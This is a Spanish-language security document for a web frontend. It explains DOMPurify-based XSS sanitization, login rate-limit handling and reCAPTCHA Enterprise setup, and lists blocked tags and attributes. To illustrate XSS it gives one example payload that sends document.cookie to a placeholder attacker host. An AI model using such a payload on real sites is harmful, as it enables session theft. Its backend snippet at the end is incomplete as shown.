# Seguridad del Frontend

## Resumen de Medidas Implementadas

| Medida | Estado | Ubicación |
|--------|--------|-----------|
| Sanitización XSS | ✅ Frontend | `SanitizerService` |
| Rate Limiting UI | ✅ Frontend | `LoginComponent` |
| reCAPTCHA Enterprise | ✅ Frontend | `RecaptchaService` |

---

## 1. Protección XSS (Cross-Site Scripting)

### ¿Qué es XSS?

Un atacante inyecta código JavaScript malicioso que se ejecuta en el navegador de otros usuarios. Ejemplo:

```html
<!-- Contenido malicioso guardado en el CMS -->
<img src="x" onerror="fetch('https://hacker.com/steal?c='+document.cookie)">
```

### Solución Implementada

Creamos `SanitizerService` que usa DOMPurify para limpiar HTML del CMS:

```typescript
// src/app/core/services/sanitizer.service.ts

// En lugar de:
this.domSanitizer.bypassSecurityTrustHtml(html); // ⚠️ PELIGROSO

// Usar:
this.sanitizerService.sanitizeHtml(html); // ✅ SEGURO
```

### Tags y Atributos Permitidos

El servicio permite solo tags seguros:

**Tags permitidos:**
- Estructura: `div`, `span`, `p`, `br`, `hr`
- Encabezados: `h1`-`h6`
- Formato: `strong`, `b`, `em`, `i`, `u`
- Listas: `ul`, `ol`, `li`
- Links: `a` (con validación de href)
- Imágenes: `img`
- Tablas: `table`, `tr`, `td`, etc.

**Tags bloqueados:**
- `script` - Scripts maliciosos
- `iframe` - Contenido externo
- `form`, `input` - Phishing
- `style` - CSS injection
- `object`, `embed` - Plugins

**Atributos bloqueados:**
- `onerror`, `onload`, `onclick` - Event handlers maliciosos
- `javascript:` en href - XSS via links

### Componentes que Usan Sanitización

| Componente | Archivo | Estado |
|------------|---------|--------|
| About Us | `about-us.component.ts` | ✅ Actualizado |
| Product Content | `product-content.component.ts` | ✅ Actualizado |
| Static Page Editor | `static-page-editor.component.ts` | ✅ Actualizado |

---

## 2. Rate Limiting en Login

### ¿Qué es?

Limita los intentos de login para prevenir ataques de fuerza bruta.

### Implementación Frontend

El `LoginComponent` ahora maneja errores HTTP 429:

```typescript
// Detecta error 429 del backend
if (err.status === 429) {
  this.startBlockTimer(60); // Bloquea UI por 60 segundos
  this.error.set('Demasiados intentos. Esperá 60 segundos.');
}
```

**Características:**
- Muestra countdown visual
- Deshabilita botón de submit
- Cambia estilo del mensaje (warning amarillo)

### Requisitos del Backend

El backend debe:

1. Contar intentos fallidos por IP/email
2. Después de 5 intentos fallidos, responder con:

```json
HTTP 429 Too Many Requests
{
  "message": "Demasiados intentos",
  "retryAfter": 60
}
```

3. Header opcional: `Retry-After: 60`

---


## 3. reCAPTCHA Enterprise

### ¿Qué es?

reCAPTCHA Enterprise protege formularios contra bots y spam. Funciona de forma invisible (score-based), sin mostrar desafíos molestos a usuarios legítimos.

### Implementación

Usamos la API JavaScript:

**1. Script en `index.html`:**
```html
<script src="https://www.google.com/recaptcha/enterprise.js?render=TU_SITE_KEY" async defer></script>
```

**2. Configuración en `environment.ts`:**
```typescript
recaptcha: {
  siteKey: '6LcGGlksAAAAAF3cxAbGTE4WZZvCYtFgk6jJZWZN',
  enabled: true
}
```

**3. Servicio `RecaptchaService`:**
```typescript
// src/app/core/services/recaptcha.service.ts

// Obtener token antes de enviar formulario
const token = await this.recaptchaService.executeRecaptcha('CONTACT');

// Enviar token al backend
this.api.submitForm({ ...formData, recaptchaToken: token });
```

### Formularios Protegidos

| Formulario | Archivo | Estado |
|------------|---------|--------|
| Contacto público | `contact-form.component.ts` | ✅ Implementado |
| Consulta propiedad | Pendiente | ⏳ |
| Login | Opcional (ya tiene rate limiting) | ⏳ |


### Requisitos del Backend
El backend debe validar el token con la API de Google:

```javascript


const data = await response.json();
// score: 0.0 (bot) a 1.0 (humano legítimo)
if (data.riskAnalysis.score < 0.5) {
  return res.status(403).json({ error: 'Verificación fallida' });
}
```
